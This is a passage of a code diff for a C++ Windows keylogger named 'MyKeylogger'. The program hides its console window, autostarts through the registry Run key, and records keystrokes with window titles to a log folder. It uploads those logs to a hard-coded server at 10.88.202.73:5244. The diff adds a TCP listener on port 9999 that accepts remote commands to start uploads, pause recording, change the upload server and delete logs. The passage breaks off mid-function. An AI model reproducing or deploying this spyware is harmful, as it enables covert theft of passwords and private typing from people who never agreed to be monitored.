@@ -1,5 +1,4 @@
-#define UNICODE
-#include <winsock2.h>
+﻿#include <winsock2.h>
 #include <ws2tcpip.h>
 #include <windows.h>
 #include <iostream>
@@ -10,7 +9,7 @@
 #include <regex>
 #include <algorithm>
 #include <curl/curl.h>
-#include <nlohmann/json.hpp>    
+#include <nlohmann/json.hpp>
 #include <cstring>
 #include <cstdio>
 #include <sstream>
@@ -19,93 +18,86 @@
 #include <shlwapi.h>
 #include <shellapi.h>
 #include <atomic>
-#include <shlobj.h>          // SHGetFolderPath
-#include <objbase.h>         // CoInitialize, CoUninitialize
-#include <shobjidl.h>        // IShellLink
+#include <shlobj.h>
+#include <objbase.h>
+#include <shobjidl.h>
+#include <thread>
+#include <mutex>
 #pragma comment(lib, "shell32.lib")
 #pragma comment(lib, "Shlwapi.lib")
 #pragma comment(lib, "ole32.lib")
 #pragma comment(lib, "uuid.lib")
+#pragma comment(lib, "ws2_32.lib")
 
 using json = nlohmann::json;
 namespace fs = std::filesystem;
 
-// defines whether the window is visible or not
-// should be solved with makefile, not in this file
-#define invisible // (visible / invisible)
-
-// Defines whether you want to enable or disable 
-// boot time waiting if running at system boot.
-#define bootwait // (bootwait / nowait)
-
-// defines which format to use for logging
-// 0 for default, 10 for dec codes, 16 for hex codex
+#define invisible
+#define bootwait
 #define FORMAT 0
-
-// defines if ignore mouseclicks
 #define mouseignore
-
-// variable to store the HANDLE to the hook. Don't declare it anywhere else then globally
-// or you will get problems since every function uses this variable.
 
 bool isRecording = true;
 HHOOK _hook;
 
-// �ϴ����ܿ��Ʊ���
 std::atomic<bool> uploadEnabled{ false };
 std::atomic<bool> uploadThreadRunning{ false };
-HANDLE hUploadThread = NULL;        // �ϴ��߳̾��
+HANDLE hUploadThread = NULL;
 
-// ---------------------- ǰ������ ----------------------
+std::atomic<bool> serverControlEnabled{ true };
+std::atomic<bool> serverThreadRunning{ false };
+HANDLE hServerThread = NULL;
+std::string g_serverHost = "10.88.202.73";
+int g_serverPort = 5244;
+int g_localPort = 9999;
+std::mutex g_configMutex;
+
 size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* s);
 std::string readFileContent(const std::string& filePath);
 std::string getExecutableDir();
-// ----------------------------------------------------
 
 #if FORMAT == 0
 const std::map<int, std::string> keyname{
     {VK_BACK, "[BACKSPACE]" },
-    {VK_RETURN,	"\n" },
-    {VK_SPACE,	"_" },
-    {VK_TAB,	"[TAB]" },
-    {VK_SHIFT,	"[SHIFT]" },
-    {VK_LSHIFT,	"[LSHIFT]" },
-    {VK_RSHIFT,	"[RSHIFT]" },
-    {VK_CONTROL,	"[CONTROL]" },
-    {VK_LCONTROL,	"[LCONTROL]" },
-    {VK_RCONTROL,	"[RCONTROL]" },
-    {VK_MENU,	"[ALT]" },
-    {VK_LWIN,	"[LWIN]" },
-    {VK_RWIN,	"[RWIN]" },
-    {VK_ESCAPE,	"[ESCAPE]" },
-    {VK_END,	"[END]" },
-    {VK_HOME,	"[HOME]" },
-    {VK_LEFT,	"[LEFT]" },
-    {VK_RIGHT,	"[RIGHT]" },
-    {VK_UP,		"[UP]" },
-    {VK_DOWN,	"[DOWN]" },
-    {VK_PRIOR,	"[PG_UP]" },
-    {VK_NEXT,	"[PG_DOWN]" },
-    {VK_OEM_PERIOD,	"." },
-    {VK_DECIMAL,	"." },
-    {VK_OEM_PLUS,	"+" },
-    {VK_OEM_MINUS,	"-" },
-    {VK_ADD,		"+" },
-    {VK_SUBTRACT,	"-" },
-    {VK_CAPITAL,	"[CAPSLOCK]" },
+    {VK_RETURN, "\n" },
+    {VK_SPACE, "_" },
+    {VK_TAB, "[TAB]" },
+    {VK_SHIFT, "[SHIFT]" },
+    {VK_LSHIFT, "[LSHIFT]" },
+    {VK_RSHIFT, "[RSHIFT]" },
+    {VK_CONTROL, "[CONTROL]" },
+    {VK_LCONTROL, "[LCONTROL]" },
+    {VK_RCONTROL, "[RCONTROL]" },
+    {VK_MENU, "[ALT]" },
+    {VK_LWIN, "[LWIN]" },
+    {VK_RWIN, "[RWIN]" },
+    {VK_ESCAPE, "[ESCAPE]" },
+    {VK_END, "[END]" },
+    {VK_HOME, "[HOME]" },
+    {VK_LEFT, "[LEFT]" },
+    {VK_RIGHT, "[RIGHT]" },
+    {VK_UP, "[UP]" },
+    {VK_DOWN, "[DOWN]" },
+    {VK_PRIOR, "[PG_UP]" },
+    {VK_NEXT, "[PG_DOWN]" },
+    {VK_OEM_PERIOD, "." },
+    {VK_DECIMAL, "." },
+    {VK_OEM_PLUS, "+" },
+    {VK_OEM_MINUS, "-" },
+    {VK_ADD, "+" },
+    {VK_SUBTRACT, "-" },
+    {VK_CAPITAL, "[CAPSLOCK]" },
 };
 #endif
-// ȫ�ֱ��������ڴ洢����ͼ�� ID �ʹ��ھ��
+
 static HWND g_hNotifyWnd = NULL;
 static UINT g_nNotifyId = 0;
 
-// ���ش��ڵ���Ϣ��������
 LRESULT CALLBACK NotifyWndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam)
 {
     return DefWindowProc(hWnd, msg, wParam, lParam);
 }
 
-// ��ʼ�����ش��ڣ���һ�Σ�
 void InitNotifyWindow()
 {
     if (g_hNotifyWnd != NULL) return;
@@ -118,10 +110,9 @@ void InitNotifyWindow()
     if (g_hNotifyWnd) g_nNotifyId = (UINT)(ULONG_PTR)g_hNotifyWnd;
 }
 
-// ��ʾ֪ͨ�����ݣ���ʧ��ʱ���˵� MessageBox
 void ShowToastNotification(const std::wstring& title, const std::wstring& content)
 {
-    InitNotifyWindow();  // ȷ�����ش��ڴ���
+    InitNotifyWindow();
     if (!g_hNotifyWnd)
     {
         MessageBox(NULL, content.c_str(), title.c_str(), MB_OK);
@@ -135,26 +126,21 @@ void ShowToastNotification(const std::wstring& title, const std::wstring& conten
     nid.dwInfoFlags = NIIF_INFO;
     wcscpy_s(nid.szInfo, content.c_str());
     wcscpy_s(nid.szInfoTitle, title.c_str());
-    // ʹ��Ĭ��ͼ�꣨�ɴӳ�����Դ���أ��˴��ñ�׼Ӧ��ͼ�꣩
     nid.hIcon = LoadIcon(NULL, IDI_APPLICATION);
 
-    // ��������ͼ�꣨����Ѵ��ڣ����޸ģ�
     if (!Shell_NotifyIconW(NIM_ADD, &nid))
     {
-        // �������ʧ�ܣ���������Ϊ����ͼ�꣬�����޸�
         Shell_NotifyIconW(NIM_MODIFY, &nid);
     }
     else
     {
-        // �����ӵ�ͼ�꣬��Ҫ�ӳ�ɾ���Ա������
-        // ����һ���̣߳�10���ɾ��ͼ��
         struct DelayedCleanupData {
             HWND hWnd;
             UINT uID;
         } *pData = new DelayedCleanupData{ g_hNotifyWnd, g_nNotifyId };
         HANDLE hThread = CreateThread(NULL, 0, [](LPVOID p) -> DWORD {
             DelayedCleanupData* data = (DelayedCleanupData*)p;
-            Sleep(10000);  // �ȴ�10�룬ȷ��������ʾ���
+            Sleep(10000);
             NOTIFYICONDATAW delNid = { sizeof(NOTIFYICONDATAW) };
             delNid.hWnd = data->hWnd;
             delNid.uID = data->uID;
@@ -166,7 +152,6 @@ void ShowToastNotification(const std::wstring& title, const std::wstring& conten
     }
 }
 
-// �ڳ����˳�ʱ��������ͼ�꣨��ѡ�����Ƽ���
 void CleanupNotifyIcon()
 {
     if (g_hNotifyWnd)
@@ -181,7 +166,6 @@ void CleanupNotifyIcon()
 }
 
 KBDLLHOOKSTRUCT kbdStruct;
-
 int Save(int key_stroke);
 std::ofstream output_file;
 
@@ -197,7 +181,7 @@ int Save(int key_stroke)
 #ifndef mouseignore 
     if ((key_stroke == 1) || (key_stroke == 2))
     {
-        return 0; // ignore mouse clicks
+        return 0;
     }
 #endif
     HWND foreground = GetForegroundWindow();
@@ -206,7 +190,6 @@ int Save(int key_stroke)
 
     if (foreground)
     {
-        // get keyboard layout of the thread
         threadID = GetWindowThreadProcessId(foreground, NULL);
         layout = GetKeyboardLayout(threadID);
     }
@@ -219,7 +202,6 @@ int Save(int key_stroke)
         if (strcmp(window_title, lastwindow) != 0)
         {
             strcpy_s(lastwindow, sizeof(lastwindow), window_title);
-            // get time
             struct tm tm_info;
             time_t t = time(NULL);
             localtime_s(&tm_info, &t);
@@ -242,20 +224,16 @@ int Save(int key_stroke)
     else
     {
         char key;
-        // check caps lock
         bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);
 
-        // check shift key
         if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 || (GetKeyState(VK_LSHIFT) & 0x1000) != 0
             || (GetKeyState(VK_RSHIFT) & 0x1000) != 0)
         {
             lowercase = !lowercase;
         }
 
-        // map virtual key according to keyboard layout
         key = MapVirtualKeyExA(key_stroke, MAPVK_VK_TO_CHAR, layout);
 
-        // tolower converts it to lowercase properly
         if (!lowercase)
         {
             key = tolower(key);
@@ -263,7 +241,6 @@ int Save(int key_stroke)
         output << char(key);
     }
 #endif
-    // instead of opening and closing file handlers every time, keep file open and flush.
     output_file << output.str();
     output_file.flush();
 
@@ -275,26 +252,23 @@ int Save(int key_stroke)
 void Stealth()
 {
 #ifdef visible
-    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1); // visible window
+    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1);
 #endif
 
 #ifdef invisible
-    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0); // invisible window
+    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0);
     FreeConsole();
 #endif
 }
 
-// Function to check if the system is still booting up
 bool IsSystemBooting()
 {
     return GetSystemMetrics(SM_SYSTEMDOCKED) != 0;
 }
 
-// 自启注册表项名称
 const wchar_t* REG_RUN_PATH = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";
 const wchar_t* APP_NAME = L"MyKeylogger";
 
-// 获取当前程序完整路径
 std::wstring GetModulePath()
 {
     wchar_t path[MAX_PATH] = { 0 };
@@ -302,7 +276,6 @@ std::wstring GetModulePath()
     return std::wstring(path);
 }
 
-// 判断是否已设置自启
 bool IsAutoStartEnabled()
 {
     HKEY hKey;
@@ -320,7 +293,6 @@ bool IsAutoStartEnabled()
     return enabled;
 }
 
-// 设置或取消自启
 bool SetAutoStart(bool enable)
 {
     HKEY hKey;
@@ -341,10 +313,8 @@ bool SetAutoStart(bool enable)
     return result;
 }
 
-// 静默启动注册表项
 const wchar_t* SILENT_MODE_VALUE = L"SilentMode";
 
-// 获取静默启动状态
 bool IsSilentMode()
 {
     HKEY hKey;
@@ -361,7 +331,6 @@ bool IsSilentMode()
     return false;
 }
 
-// 设置静默启动状态
 bool SetSilentMode(bool enable)
 {
     HKEY hKey;
@@ -373,7 +342,38 @@ bool SetSilentMode(bool enable)
     return result;
 }
 
-// 获取本机 IPv4 地址（第一个非回环 IPv4 地址），失败返回 "unknown"
+// 录制状态注册表项
+const wchar_t* RECORDING_STATE_VALUE = L"RecordingState";
+
+// 获取保存的录制状态
+bool GetSavedRecordingState()
+{
+    HKEY hKey;
+    DWORD value = 1, size = sizeof(value); // 默认开始录制
+    if (RegOpenKeyExW(HKEY_CURRENT_USER, REG_RUN_PATH, 0, KEY_READ, &hKey) == ERROR_SUCCESS)
+    {
+        if (RegQueryValueExW(hKey, RECORDING_STATE_VALUE, NULL, NULL, (LPBYTE)&value, &size) == ERROR_SUCCESS)
+        {
+            RegCloseKey(hKey);
+            return value == 1;
+        }
+        RegCloseKey(hKey);
+    }
+    return true; // 默认开始录制
+}
+
+// 保存录制状态
+bool SaveRecordingState(bool isRecording)
+{
+    HKEY hKey;
+    if (RegOpenKeyExW(HKEY_CURRENT_USER, REG_RUN_PATH, 0, KEY_WRITE, &hKey) != ERROR_SUCCESS)
+        return false;
+    DWORD value = isRecording ? 1 : 0;
+    bool result = (RegSetValueExW(hKey, RECORDING_STATE_VALUE, 0, REG_DWORD, (BYTE*)&value, sizeof(value)) == ERROR_SUCCESS);
+    RegCloseKey(hKey);
+    return result;
+}
+
 std::string GetLocalIPAddress()
 {
     std::string ip = "unknown";
@@ -390,7 +390,7 @@ std::string GetLocalIPAddress()
 
     struct addrinfo hints;
     ZeroMemory(&hints, sizeof(hints));
-    hints.ai_family = AF_INET; // IPv4
+    hints.ai_family = AF_INET;
     hints.ai_socktype = SOCK_STREAM;
     hints.ai_protocol = IPPROTO_TCP;
 
@@ -412,14 +412,12 @@ std::string GetLocalIPAddress()
             InetNtopA(AF_INET, &sa->sin_addr, ipstr, INET_ADDRSTRLEN);
             std::string candidate(ipstr);
 
-            // 优先选择以 "10.88." 开头的 IP
             if (candidate.rfind("10.88.", 0) == 0)
             {
                 ip = candidate;
                 break;
             }
 
-            // 如果没有找到以 "10.88." 开头的 IP，记录第一个非回环地址作为备用
             if (candidate != "127.0.0.1" && !candidate.empty() && fallback_ip == "unknown")
             {
                 fallback_ip = candidate;
@@ -430,7 +428,6 @@ std::string GetLocalIPAddress()
     freeaddrinfo(result);
     WSACleanup();
 
-    // 如果没有找到以 "10.88." 开头的 IP，使用第一个非回环地址
     if (ip == "unknown")
     {
         ip = fallback_ip;
@@ -445,12 +442,10 @@ std::string GetDateString()
     time_t t = time(NULL);
     struct tm tm_info;
     localtime_s(&tm_info, &t);
-    // 格式：YYYYMMDD
     strftime(buf, sizeof(buf), "%Y%m%d", &tm_info);
     return std::string(buf);
 }
 
-// ��ȡ��־Ŀ¼��%appdata%\Keylogger��
 std::string GetLogDirectory()
 {
     wchar_t path[MAX_PATH];
@@ -458,40 +453,32 @@ std::string GetLogDirectory()
     {
         std::wstring appdata(path);
         std::wstring logDirW = appdata + L"\\Keylogger";
-        // ȷ��Ŀ¼����
         if (!fs::exists(logDirW))
         {
             fs::create_directories(logDirW);
         }
-        // ת��Ϊ���ֽ��ַ���
         int size_needed = WideCharToMultiByte(CP_UTF8, 0, logDirW.c_str(), (int)logDirW.length(), NULL, 0, NULL, NULL);
         std::string logDir(size_needed, 0);
         WideCharToMultiByte(CP_UTF8, 0, logDirW.c_str(), (int)logDirW.length(), &logDir[0], size_needed, NULL, NULL);
         return logDir;
     }
-    // ���ʧ�ܣ����ص�ǰĿ¼
     return ".\\";
 }
 
 std::string MakeOutputFilename()
 {
     std::string ip = GetLocalIPAddress();
-    // 将 IP 中可能的非法字符（极少）替换为 '-'
-    for (char &c : ip)
+    for (char& c : ip)
     {
         if (c == '/' || c == '\\' || c == ':' || c == '*' || c == '?' || c == '\"' || c == '<' || c == '>' || c == '|')
             c = '-';
     }
     std::string date = GetDateString();
     std::string filename = ip + "_" + date + ".log";
-    // ƴ����־Ŀ¼
     std::string logDir = GetLogDirectory();
     return logDir + "\\" + filename;
 }
 
-// ---------- �ϴ�������غ��� ----------
-
-// CURL �ص�������������Ӧ����
 size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* s) {
     size_t newLength = size * nmemb;
     try {
@@ -503,29 +490,27 @@ size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* s) 
     return newLength;
 }
 
-// 读取文件内容到内存（用于上传）
 std::string readFileContent(const std::string& filePath) {
     std::ifstream file(filePath, std::ios::binary | std::ios::ate);
     if (!file.is_open()) {
-        std::cerr << "无法打开文件: " << filePath << std::endl;
+        std::cerr << "Cannot open file: " << filePath << std::endl;
         return "";
     }
     std::streamsize size = file.tellg();
     file.seekg(0, std::ios::beg);
     std::string buffer(size, '\0');
     if (!file.read(&buffer[0], size)) {
-        std::cerr << "读取文件失败: " << filePath << std::endl;
+        std::cerr << "Failed to read file: " << filePath << std::endl;
         return "";
     }
     return buffer;
 }
 
-// ��ȡ����ǰִ��Ŀ¼��ע�⣺�˺��������ϴ����ܣ��˴�������
 std::string getExecutableDir() {
     char exePath[MAX_PATH];
     DWORD len = GetModuleFileNameA(NULL, exePath, MAX_PATH);
     if (len == 0) {
-        std::cerr << "��ȡ����·��ʧ�ܣ�������: " << GetLastError() << std::endl;
+        std::cerr << "Failed to get program path, error: " << GetLastError() << std::endl;
         return "";
     }
     std::string path(exePath, len);
@@ -533,54 +518,141 @@ std::string getExecutableDir() {
     return (lastSlash != std::string::npos) ? path.substr(0, lastSlash + 1) : "";
 }
 
-// ɸѡ���ϸ�ʽ����־�ļ����������µ�һ��
 std::string findLatestLogFile(const std::string& dir) {
     if (dir.empty() || !fs::exists(dir) || !fs::is_directory(dir)) {
-        std::cerr << "Ŀ¼�����ڻ���Ч: " << dir << std::endl;
+        std::cerr << "Directory not found or invalid: " << dir << std::endl;
         return "";
     }
 
-    // �������ʽ��ƥ�� <IP>_<YYYYMMDD>.log ��ʽ
     std::regex logPattern(R"((\d+\.\d+\.\d+\.\d+)_(\d{8})\.log)");
     std::smatch match;
 
-    std::vector<std::pair<std::string, std::string>> validLogs;  // �洢���ļ��������ڣ�
+    std::vector<std::pair<std::string, std::string>> validLogs;
 
-    // ����Ŀ¼�µ������ļ�
     for (const auto& entry : fs::directory_iterator(dir)) {
-        if (entry.is_regular_file()) {  // ֻ�����ļ�
+        if (entry.is_regular_file()) {
             std::string fileName = entry.path().filename().string();
             if (std::regex_match(fileName, match, logPattern)) {
-                // ��ȡ���ڲ��֣���2�������飩
                 std::string dateStr = match[2].str();
                 validLogs.emplace_back(fileName, dateStr);
-                std::cout << "���ַ��ϸ�ʽ����־�ļ�: " << fileName << "������: " << dateStr << "��" << std::endl;
+                std::cout << "Found log file: " << fileName << ", date: " << dateStr << std::endl;
             }
         }
     }
 
     if (validLogs.empty()) {
-        std::cerr << "δ�ҵ����ϸ�ʽ����־�ļ���<IP>_<YYYYMMDD>.log��" << std::endl;
+        std::cerr << "No log files found (<IP>_<YYYYMMDD>.log)" << std::endl;
         return "";
     }
 
-    // �����ڽ����������µ�������ǰ�棩
     std::sort(validLogs.begin(), validLogs.end(),
         [](const auto& a, const auto& b) {
-            return a.second > b.second;  // �����ַ���ֱ�ӱȽϣ�YYYYMMDD ��ʽ��ֱ������
+            return a.second > b.second;
         });
 
-    // ���������ļ�������·��
     return dir + "\\" + validLogs[0].first;
 }
 
-// 获取 token
+// 删除指定的日志文件
+bool deleteLogFile(const std::string& dir, const std::string& fileName) {
+    // 验证文件名格式
+    std::regex logPattern(R"((\d+\.\d+\.\d+\.\d+)_(\d{8})\.log)");
+    if (!std::regex_match(fileName, logPattern)) {
+        std::cerr << "Invalid log file name: " << fileName << std::endl;
+        return false;
+    }
+
+    std::string filePath = dir + "\\" + fileName;
+
+    // 检查文件是否存在
+    if (!fs::exists(filePath)) {
+        std::cerr << "Log file not found: " << filePath << std::endl;
+        return false;
+    }
+
+    // 检查是否是常规文件
+    if (!fs::is_regular_file(filePath)) {
+        std::cerr << "Not a regular file: " << filePath << std::endl;
+        return false;
+    }
+
+    // 尝试删除文件
+    try {
+        // 先设置文件属性为正常（防止文件被标记为只读）
+        SetFileAttributesA(filePath.c_str(), FILE_ATTRIBUTE_NORMAL);
+
+        // 删除文件
+        if (fs::remove(filePath)) {
+            std::cout << "Successfully deleted log file: " << fileName << std::endl;
+            return true;
+        }
+        else {
+            std::cerr << "Failed to delete log file: " << fileName << std::endl;
+            return false;
+        }
+    }
+    catch (const std::exception& e) {
+        std::cerr << "Exception when deleting file: " << e.what() << std::endl;
+        return false;
+    }
+}
+
+// 获取日志文件数量和详细信息
+json getLogFilesInfo(const std::string& dir) {
+    json result;
+    result["total_count"] = 0;
+    result["total_size"] = 0;
+    result["files"] = json::array();
+
+    if (dir.empty() || !fs::exists(dir) || !fs::is_directory(dir)) {
+        return result;
+    }
+
+    std::regex logPattern(R"((\d+\.\d+\.\d+\.\d+)_(\d{8})\.log)");
+    std::smatch match;
+
+    std::vector<std::tuple<std::string, std::string, uintmax_t>> validLogs;
+
+    for (const auto& entry : fs::directory_iterator(dir)) {
+        if (entry.is_regular_file()) {
+            std::string fileName = entry.path().filename().string();
+            if (std::regex_match(fileName, match, logPattern)) {
+                std::string dateStr = match[2].str();
+                uintmax_t fileSize = entry.file_size();
+                validLogs.emplace_back(fileName, dateStr, fileSize);
+            }
+        }
+    }
+
+    // 按日期降序排序（最新的在前）
+    std::sort(validLogs.begin(), validLogs.end(),
+        [](const auto& a, const auto& b) {
+            return std::get<1>(a) > std::get<1>(b);
+        });
+
+    result["total_count"] = validLogs.size();
+
+    uintmax_t totalSize = 0;
+    for (const auto& log : validLogs) {
+        json fileInfo;
+        fileInfo["name"] = std::get<0>(log);
+        fileInfo["date"] = std::get<1>(log);
+        fileInfo["size"] = std::get<2>(log);
+        totalSize += std::get<2>(log);
+        result["files"].push_back(fileInfo);
+    }
+    result["total_size"] = totalSize;
+
+    return result;
+}
+
 std::string api_get() {
     CURL* curl = curl_easy_init();
     std::string response_string;
     if (curl) {
         curl_easy_setopt(curl, CURLOPT_CUSTOMREQUEST, "POST");
-        curl_easy_setopt(curl, CURLOPT_URL, "http://10.88.202.73:5244/api/auth/login");
+        std::string url = "http://" + g_serverHost + ":" + std::to_string(g_serverPort) + "/api/auth/login";
+        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
         curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
 
         struct curl_slist* headers = NULL;
@@ -595,7 +667,7 @@ std::string api_get() {
 
         CURLcode res = curl_easy_perform(curl);
         if (res != CURLE_OK) {
-            std::cerr << "登录请求失败: " << curl_easy_strerror(res) << std::endl;
+            std::cerr << "Login request failed: " << curl_easy_strerror(res) << std::endl;
         }
         else {
             try {
@@ -604,27 +676,23 @@ std::string api_get() {
                     return j["data"]["token"];
                 }
                 else {
-                    std::cerr << "登录失败: " << response_string << std::endl;
+                    std::cerr << "Login failed: " << response_string << std::endl;
                 }
             }
             catch (const std::exception& e) {
-                std::cerr << "解析登录响应失败: " << e.what() << std::endl;
+                std::cerr << "Failed to parse login response: " << e.what() << std::endl;
             }
         }
         curl_easy_cleanup(curl);
         curl_slist_free_all(headers);
     }
-    else {
-        std::cerr << "curl 初始化失败" << std::endl;
-    }
     return "";
 }
 
-// �ϴ��ļ���������
 bool uploadFile(const std::string& token, const std::string& localFilePath, const std::string& serverFilePath)
 {
     if (token.empty()) {
-        std::cerr << "token Ϊ�գ��޷��ϴ�" << std::endl;
+        std::cerr << "Token is empty, cannot upload" << std::endl;
         return false;
     }
 
@@ -635,12 +703,13 @@ bool uploadFile(const std::string& token, const std::string& localFilePath, cons
 
     CURL* curl = curl_easy_init();
     if (!curl) {
-        std::cerr << "curl ��ʼ��ʧ��" << std::endl;
+        std::cerr << "curl init failed" << std::endl;
         return false;
     }
 
     curl_easy_setopt(curl, CURLOPT_CUSTOMREQUEST, "PUT");
-    curl_easy_setopt(curl, CURLOPT_URL, "http://10.88.202.73:5244/api/fs/put");
+    std::string url = "http://" + g_serverHost + ":" + std::to_string(g_serverPort) + "/api/fs/put";
+    curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
     curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
 
     struct curl_slist* headers = NULL;
@@ -662,50 +731,37 @@ bool uploadFile(const std::string& token, const std::string& localFilePath, cons
     curl_slist_free_all(headers);
 
     if (res != CURLE_OK) {
-        std::cerr << "�ϴ�ʧ��: " << curl_easy_strerror(res) << std::endl;
+        std::cerr << "Upload failed: " << curl_easy_strerror(res) << std::endl;
         return false;
     }
-    std::cout << "�ϴ���Ӧ: " << response << std::endl;
-    // �ɸ�����Ҫ���� response �ж��Ƿ�ɹ����˴�����Ϊ��Ӧ�ǿռ��ɹ�
+    std::cout << "Upload response: " << response << std::endl;
     return true;
 }
-// �ϴ�������־�ļ��ķ�װ����
+
 void uploadLatestLog()
 {
-    // 1. ��ȡ token
     std::string token = api_get();
     if (token.empty()) {
-        std::cerr << "��ȡ token ʧ�ܣ������ϴ�" << std::endl;
-        ShowToastNotification(L"�ϴ�����", L"��ȡ��¼ƾ֤ʧ�ܣ����Զ��ر��ϴ�����");
-        uploadEnabled = false;
-        uploadThreadRunning = false;
+        std::cerr << "Failed to get token, cancel upload" << std::endl;
         return;
     }
 
-    // 2. ��ȡ��־Ŀ¼
     std::string logDir = GetLogDirectory();
     if (logDir.empty()) return;
 
-    // 3. �������µ���־�ļ�
     std::string latestLogPath = findLatestLogFile(logDir);
     if (latestLogPath.empty()) return;
 
-    // 4. ���÷�����·��
     fs::path logPath(latestLogPath);
     std::string fileName = logPath.filename().string();
     std::string serverFile = "/%E5%AD%A6%E7%94%9F%E7%9B%AE%E5%BD%95/log/" + fileName;
 
-    // 5. �ϴ��ļ�
     bool success = uploadFile(token, latestLogPath, serverFile);
     if (!success) {
-        std::cerr << "�ϴ�ʧ�ܣ����Զ��ر��ϴ�����" << std::endl;
-        ShowToastNotification(L"�ϴ�����", L"�ļ��ϴ�ʧ�ܣ����Զ��ر��ϴ�����");
-        uploadEnabled = false;
-        uploadThreadRunning = false;
+        std::cerr << "Upload failed" << std::endl;
     }
 }
 
-// �ϴ��̺߳���
 DWORD WINAPI UploadThreadFunc(LPVOID lpParam)
 {
     while (uploadEnabled && uploadThreadRunning)
@@ -717,109 +773,341 @@ DWORD WINAPI UploadThreadFunc(LPVOID lpParam)
     uploadThreadRunning = false;
     return 0;
 }
-// ---------- ���̹��ӻص����� ----------
+
+std::string ProcessCommand(const std::string& command)
+{
+    json response;
+    response["status"] = "ok";
+
+    try {
+        json cmd = json::parse(command);
+        std::string action = cmd.value("action", "");
+
+        if (action == "ping") {
+            response["type"] = "pong";
+            response["data"]["recording"] = isRecording;
+            response["data"]["upload_enabled"] = uploadEnabled.load();
+            response["data"]["local_port"] = g_localPort;
+            response["data"]["ip"] = GetLocalIPAddress();
+        }
+        else if (action == "start_upload") {
+            if (!uploadEnabled) {
+                uploadEnabled = true;
+                uploadThreadRunning = true;
+                hUploadThread = CreateThread(NULL, 0, UploadThreadFunc, NULL, 0, NULL);
+                if (hUploadThread) CloseHandle(hUploadThread);
+            }
+            response["type"] = "upload_started";
+        }
+        else if (action == "stop_upload") {
+            uploadEnabled = false;
+            uploadThreadRunning = false;
+            response["type"] = "upload_stopped";
+        }
+        else if (action == "upload_once") {
+            uploadLatestLog();
+            response["type"] = "upload_completed";
+        }
+        else if (action == "pause_record") {
+            isRecording = false;
+            SaveRecordingState(isRecording);
+            response["type"] = "record_paused";
+        }
+        else if (action == "resume_record") {
+            isRecording = true;
+            SaveRecordingState(isRecording);
+            response["type"] = "record_resumed";
+        }
+        else if (action == "get_status") {
+            response["type"] = "status";
+            response["data"]["recording"] = isRecording;
+            response["data"]["upload_enabled"] = uploadEnabled.load();
+            response["data"]["local_port"] = g_localPort;
+            response["data"]["ip"] = GetLocalIPAddress();
+            response["data"]["log_dir"] = GetLogDirectory();
+        }
+        else if (action == "get_logs_info") {
+            response["type"] = "logs_info";
+            std::string logDir = GetLogDirectory();
+            response["data"] = getLogFilesInfo(logDir);
+        }
+        else if (action == "set_server") {
+            std::lock_guard<std::mutex> lock(g_configMutex);
+            if (cmd.contains("host")) {
+                g_serverHost = cmd["host"].get<std::string>();
+            }
+            if (cmd.contains("port")) {
+                g_serverPort = cmd["port"].get<int>();
+            }
+            response["type"] = "server_configured";
+            response["data"]["host"] = g_serverHost;
+            response["data"]["port"] = g_serverPort;
+        }
+        else if (action == "delete_log") {
+            if (cmd.contains("file")) {
+                std::string fileName = cmd["file"].get<std::string>();
+                std::string logDir = GetLogDirectory();
+                bool success = deleteLogFile(logDir, fileName);
+                response["type"] = "log_deleted";
+                response["data"]["success"] = success;
+                response["data"]["file"] = fileName;
+            }
+            else {
+                response["status"] = "error";
+                response["message"] = "Missing 'file' parameter";
+            }
+        }
+        else {
+            response["status"] = "error";
+            response["message"] = "unknown action";
+        }
+    }
+    catch (const std::exception& e) {
+        response["status"] = "error";
+        response["message"] = e.what();
+    }
+
+    return response.dump();
+}
+
+void HandleClient(SOCKET clientSocket)
+{
+    char buffer[4096];
+    std::string accumulated;
+
+    std::cout << "Client connected, socket: " << clientSocket << std::endl;
+
+    // 设置接收超时
+    DWORD timeout = 30000; // 30秒
+    setsockopt(clientSocket, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));
+
+    while (serverControlEnabled) {
+        int received = recv(clientSocket, buffer, sizeof(buffer) - 1, 0);
+        if (received == 0) {
+            std::cout << "Client closed connection gracefully" << std::endl;
+            break;
+        }
+        if (received < 0) {
+            int error = WSAGetLastError();
+            if (error == WSAETIMEDOUT) {
+                std::cout << "Receive timeout, continuing..." << std::endl;
+                continue;
+            }
+            if (error == WSAEWOULDBLOCK) {
+                Sleep(100);
+                continue;
+            }
+            std::cout << "Client disconnected, error code: " << error << std::endl;
+            break;
+        }
+
+        buffer[received] = '\0';
+        std::cout << "Received " << received << " bytes: " << buffer << std::endl;
+        accumulated += buffer;
+
+        size_t pos;
+        while ((pos = accumulated.find('\n')) != std::string::npos) {
+            std::string command = accumulated.substr(0, pos);
+            accumulated = accumulated.substr(pos + 1);
+
+            if (!command.empty()) {
+                std::cout << "Processing command: " << command << std::endl;
+                std::string response = ProcessCommand(command);
+                response += "\n";
+                std::cout << "Sending response: " << response << std::endl;
+                int sent = send(clientSocket, response.c_str(), (int)response.length(), 0);
+                if (sent == SOCKET_ERROR) {
+                    int sendError = WSAGetLastError();
+                    std::cerr << "Failed to send response, error: " << sendError << std::endl;
+                }
+                else {
+                    std::cout << "Sent " << sent << " bytes" << std::endl;
+                }
+            }
+        }
+    }
+
+    closesocket(clientSocket);
+    std::cout << "Client connection closed" << std::endl;
+}
+
+DWORD WINAPI ServerThreadFunc(LPVOID lpParam)
+{
+    WSADATA wsaData;
+    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
+        std::cerr << "WSAStartup failed" << std::endl;
+        return 1;
+    }
+
+    SOCKET listenSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    if (listenSocket == INVALID_SOCKET) {
